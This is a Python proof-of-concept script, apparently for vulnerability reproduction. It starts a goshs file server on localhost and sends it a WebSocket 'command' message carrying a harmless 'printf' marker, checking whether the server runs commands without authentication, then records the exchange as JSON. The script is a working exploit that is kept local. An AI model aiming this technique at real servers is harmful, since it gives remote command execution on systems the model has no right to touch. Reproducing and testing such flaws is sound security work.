#!/usr/bin/env python3
import argparse
import base64
import hashlib
import http.client
import json
import os
import socket
import struct
import subprocess
import sys
import tempfile
import time


MAX_CAPTURE = 12000
WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"


class PocError(Exception):
    pass


def truncate_text(data, limit=MAX_CAPTURE):
    if isinstance(data, bytes):
        text = data.decode("utf-8", "replace")
    else:
        text = str(data)
    if len(text) <= limit:
        return text
    keep = limit // 2
    return text[:keep] + "\n...[truncated]...\n" + text[-keep:]


def reserve_port():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]
    finally:
        sock.close()


def wait_http_ready(port, deadline):
    last_error = None
    while time.monotonic() < deadline:
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=0.5)
            conn.request("GET", "/")
            resp = conn.getresponse()
            resp.read()
            conn.close()
            if resp.status < 500:
                return
        except Exception as exc:
            last_error = exc
            time.sleep(0.1)
    raise PocError("HTTP endpoint did not become ready: %s" % last_error)


def recv_until(sock, marker, deadline):
    data = b""
    while marker not in data:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise PocError("timed out waiting for websocket handshake")
        sock.settimeout(min(0.5, remaining))
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            continue
        if not chunk:
            raise PocError("connection closed during websocket handshake")
        data += chunk
        if len(data) > 65536:
            raise PocError("websocket handshake response too large")
    return data


def websocket_connect(port, deadline):
    remaining = max(0.1, deadline - time.monotonic())
    sock = socket.create_connection(("127.0.0.1", port), timeout=remaining)
    key = base64.b64encode(os.urandom(16)).decode("ascii")
    request = (
        "GET /?ws HTTP/1.1\r\n"
        "Host: 127.0.0.1:%d\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: %s\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "Origin: http://127.0.0.1:%d\r\n"
        "\r\n"
    ) % (port, key, port)
    sock.sendall(request.encode("ascii"))
    response = recv_until(sock, b"\r\n\r\n", deadline)
    header_text = response.split(b"\r\n\r\n", 1)[0].decode("iso-8859-1", "replace")
    lines = header_text.split("\r\n")
    if not lines or " 101 " not in (" " + lines[0] + " "):
        raise PocError("websocket upgrade failed: %s" % lines[0] if lines else "empty response")
    headers = {}
    for line in lines[1:]:
        if ":" in line:
            name, value = line.split(":", 1)
            headers[name.strip().lower()] = value.strip()
    expected = base64.b64encode(hashlib.sha1((key + WS_GUID).encode("ascii")).digest()).decode("ascii")
    if headers.get("sec-websocket-accept") != expected:
        raise PocError("websocket accept key mismatch")
    return sock


def websocket_send_text(sock, text):
    payload = text.encode("utf-8")
    frame = bytearray([0x81])
    length = len(payload)
    if length < 126:
        frame.append(0x80 | length)
    elif length < 65536:
        frame.append(0x80 | 126)
        frame.extend(struct.pack("!H", length))
    else:
        frame.append(0x80 | 127)
        frame.extend(struct.pack("!Q", length))
    mask = os.urandom(4)
    frame.extend(mask)
    frame.extend(payload[i] ^ mask[i % 4] for i in range(length))
    sock.sendall(frame)


def recvn(sock, count, deadline):
    chunks = []
    total = 0
    while total < count:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError
        sock.settimeout(min(0.5, remaining))
        chunk = sock.recv(count - total)
        if not chunk:
            raise EOFError
        chunks.append(chunk)
        total += len(chunk)
    return b"".join(chunks)


def websocket_recv_frame(sock, deadline):
    header = recvn(sock, 2, deadline)
    first, second = header
    opcode = first & 0x0F
    length = second & 0x7F
    if length == 126:
        length = struct.unpack("!H", recvn(sock, 2, deadline))[0]
    elif length == 127:
        length = struct.unpack("!Q", recvn(sock, 8, deadline))[0]
    mask = recvn(sock, 4, deadline) if (second & 0x80) else None
    payload = recvn(sock, length, deadline) if length else b""
    if mask:
        payload = bytes(payload[i] ^ mask[i % 4] for i in range(length))
    return opcode, payload


def drain_text_messages(sock, seconds):
    messages = []
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        try:
            opcode, payload = websocket_recv_frame(sock, deadline)
        except TimeoutError:
            break
        except (EOFError, OSError):
            break
        if opcode == 0x1:
            messages.append(payload.decode("utf-8", "replace"))
        elif opcode == 0x8:
            break
        elif opcode in (0x9, 0xA):
            # Control frames are not JSON application messages and are omitted
            # from the protocol transcript.
            continue
    return messages


def stop_process(proc, timeout=3.0):
    if proc is None:
        return b"", b""
    if proc.poll() is None:
        proc.terminate()
    try:
        return proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        return proc.communicate(timeout=timeout)


def build_result(binary, command, returncode, timed_out, started_at, stdout, stderr, transcript, error):
    signal = None
    if isinstance(returncode, int) and returncode < 0:
        signal = -returncode
    return {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": signal,
        "timed_out": timed_out,
        "runtime_ms": int((time.monotonic() - started_at) * 1000),
        "stdout": truncate_text(stdout),
        "stderr": truncate_text(stderr),
        "observable": {
            "kind": "protocol_transcript",
            "value": "\n".join(transcript),
            "path": None,
        },
        "error": error,
    }


def run(args):
    started_at = time.monotonic()
    timeout = max(1.0, float(args.timeout))
    deadline = started_at + timeout
    proc = None
    stdout = b""
    stderr = b""
    transcript = []
    timed_out = False
    error = None
    command = None

    try:
        port = reserve_port()
        with tempfile.TemporaryDirectory(prefix="goshs-poc-webroot-") as webroot:
            command = [args.binary, "-i", "127.0.0.1", "-p", str(port), "-d", webroot]
            env = os.environ.copy()
            for name in ("HTTPS_PROXY", "HTTP_PROXY", "https_proxy", "http_proxy"):
                env[name] = "http://127.0.0.1:9"
            try:
                proc = subprocess.Popen(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env=env,
                )
            except Exception as exc:
                raise PocError("could not start target binary: %s" % exc)

            wait_http_ready(port, deadline)
            ws = websocket_connect(port, deadline)
            try:
                drain_text_messages(ws, 0.2)
                message = {"type": "command", "content": "printf poc_ws_command_execution"}
                encoded = json.dumps(message, separators=(",", ":"))
                transcript.append("C> " + encoded)
                websocket_send_text(ws, encoded)
                for reply in drain_text_messages(ws, min(2.0, max(0.1, deadline - time.monotonic()))):
                    transcript.append("S< " + reply)
            finally:
                try:
                    ws.close()
                except Exception:
                    pass
            stdout, stderr = stop_process(proc)
    except TimeoutError:
        timed_out = True
        error = "run timed out"
        stdout, stderr = stop_process(proc)
    except Exception as exc:
        if time.monotonic() >= deadline:
            timed_out = True
        error = str(exc)
        stdout, stderr = stop_process(proc)

    return build_result(
        args.binary,
        command if command is not None else [args.binary, "-i", "127.0.0.1", "-p", "", "-d", ""],
        proc.returncode if proc is not None else None,
        timed_out,
        started_at,
        stdout,
        stderr,
        transcript,
        error,
    )


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=25)
    args = parser.parse_args()

    result = run(args)
    output = json.dumps(result, indent=2, sort_keys=False)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as fh:
            fh.write(output)
            fh.write("\n")
    else:
        print(output)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        fallback = {
            "binary": "",
            "command": [],
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {"kind": "protocol_transcript", "value": "", "path": None},
            "error": "internal script failure: %s" % exc,
        }
        print(json.dumps(fallback, indent=2))
        sys.exit(0)
